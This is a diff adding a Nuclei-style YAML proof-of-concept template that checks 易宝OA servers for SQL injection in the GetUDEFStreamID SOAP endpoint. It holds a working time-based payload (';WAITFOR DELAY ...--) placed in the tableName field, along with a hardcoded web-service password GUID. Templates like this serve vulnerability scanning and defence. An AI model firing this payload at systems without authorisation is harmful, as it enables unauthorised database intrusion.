@@ -1,0 +1,65 @@
+id: poc-yaml-yi-bao-oa-getudefstreamid-sqli
+info:
+  name: 易宝OA GetUDEFStreamID SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    易宝OA GetUDEFStreamID endpoint is vulnerable to SQL Injection allowing attackers to potentially execute arbitrary SQL commands.
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "欢迎登录易宝OA系统"
+
+  - id: sqli-attempt
+    method: POST
+    path:
+      - "{{BaseURL}}/WebService/BasicService.asmx"
+    headers:
+      SOAPAction: "http://tempuri.org/GetUDEFStreamID"
+      Content-Type: "text/xml; charset=utf-8"
+    body: |-
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+          <GetUDEFStreamID xmlns="http://tempuri.org/">
+            <tableName>';WAITFOR DELAY '0:0:{{t1}}'--</tableName>
+            <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
+          </GetUDEFStreamID>
+        </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<GetUDEFStreamIDResult>"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
